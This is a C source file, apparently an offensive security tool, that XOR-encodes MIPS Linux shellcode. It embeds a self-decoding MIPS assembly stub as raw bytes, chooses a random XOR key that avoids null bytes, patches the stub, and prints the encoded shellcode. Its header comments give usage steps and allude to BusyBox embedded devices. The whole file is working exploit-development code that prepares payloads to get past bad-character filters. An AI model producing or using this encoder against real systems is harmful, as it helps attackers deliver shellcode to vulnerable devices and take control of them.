#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>

#define DEBUG 0

/*
 *
 * entropy [at] phiral.net
 * mips (linux) shellcode xor encoder
 *
 * \xAB\xCD is overwritten with jmp back offset
 * \x00\x00 is overwritten with the byte its xored with
 *
 * 0. gcc encoder.c -o encoder
 * 1. perl -e 'print "\xsh\xel\xlc\xod\xe0";' > sc.bin
 * 2. ./encode
 *
 * can possibly get rid of \x24\x18\xf9\x9a to be -4
 *
 * sup busyboxen :o
 *
 */

unsigned char encoder[] =
"\x24\x18\xf9\x9a"  /* li $t8, -0x666                  */
"\x07\x10\xff\xff"  /* p:  bltzal $t8, p               */
"\x28\x18\xff\xff"  /* slti $t8, $zero, -1             */
"\x27\xe8\x10\x01"  /* addu $t0, $ra, 4097             */
"\x25\x08\xAB\xCD"  /* addu $t0, $t0, -4097+44+len+1   */
"\x3c\x09\x00\x00"  /* lui $t1, 0xXXXX                 */
"\x35\x29\x00\x00"  /* ori $t1, $t1, 0xXXXX            */
"\x3c\x0b\x01\xe0"  /* lui $t3, 0x01e0                 */
"\x35\x6b\x78\x27"  /* ori $t3, $t3, 0x7827            */
"\x8d\x0a\xff\xff"  /* x:  lw $t2, -1($t0)             */
"\x01\x49\x60\x26"  /* xor $t4, $t2, $t1               */
"\xad\x0c\xff\xff"  /* sw $t4, -1($t0)                 */
"\x25\x08\xff\xfc"  /* addu $t0, $t0, -4               */
"\x15\x4b\xff\xfb"  /* bne $t2, $t3, -20               */
"\x01\xe0\x78\x27"; /* nor $t7, $t7, $zero             */

int
main(int argc, char **argv) {

    struct stat sstat;
    int a, i, n, fd, len, elen, xor_with;
    unsigned char *fbuf, *ebuf;
    unsigned char bad_bytes[256] = {0};
    unsigned char good_bytes[256] = {0};

    if (lstat("sc.bin", &sstat) < 0) {
        perror("lstat");
        _exit(-1);
    }

    len = sstat.st_size;
    if ((fbuf = (unsigned char *)malloc(len)) == NULL) {
        perror("malloc");
        _exit(-1);
    }

    if ((fd = open("sc.bin", O_RDONLY)) < 0) {
        perror("open");
        _exit(-1);
    }

    if (read(fd, fbuf, len) != len) {
        perror("read");
        _exit(-1);
    }

    close(fd);

    /* try every byte xored, if its \x0 add to bad_bytes */
    for (n = 0; n < len; n++) {
        for (i = 1; i < 256; i++) {
             if ((i^*(fbuf+n)) == 0) bad_bytes[i] = i;
        }
    }

    /* if its not a bad_byte its a good_one (ordered) */
    for (i = 1, n = 0; i < 256; i++) {
        if (bad_bytes[i] == '\0') good_bytes[n++] = i;
    }

    srand((unsigned)time(NULL));
    xor_with = good_bytes[rand()%n];

    if (xor_with) {
        printf("\n[x] Choose to XOR with 0x%02x\n\n", xor_with);

        /* overwrite bytes 18, 19 with subtract addr */
        /* 44 bytes to jmp past our asm + sc len + 1 */
        a = -4097 + 44 + len + 1;
        encoder[18] = (char)(((int)a) >> 8);
        encoder[19] = (char)a;

        /* overwrite bytes 22, 23, 26, 27 of encoder */
        encoder[22] = xor_with;
        encoder[23] = xor_with;
        encoder[26] = xor_with;
        encoder[27] = xor_with;

        elen = strlen((char *)encoder);

        if ((ebuf = (unsigned char *)malloc(elen+len+1)) == NULL) {
            perror("malloc");
            _exit(-1);
        }

        memset(ebuf, '\x0', sizeof(ebuf));
        memcpy(ebuf, encoder, sizeof(encoder));

        for (i = 0; i < len; i++) {
            ebuf[(i+elen)]  = xor_with^*(fbuf+i);
        }

        printf("[S] Shellcode: \n\"");
        for (i = 0; i < strlen((char *)ebuf); i++) {
            if (i > 0 && i % 4 == 0) printf("\"\n\"");
            printf("\\x%02x", ebuf[i]);
        }
        printf("\"\n\n");

    } else {
        printf("[*] No byte found to XOR with :(\n");
        _exit(-1);
    }

    return 0;
}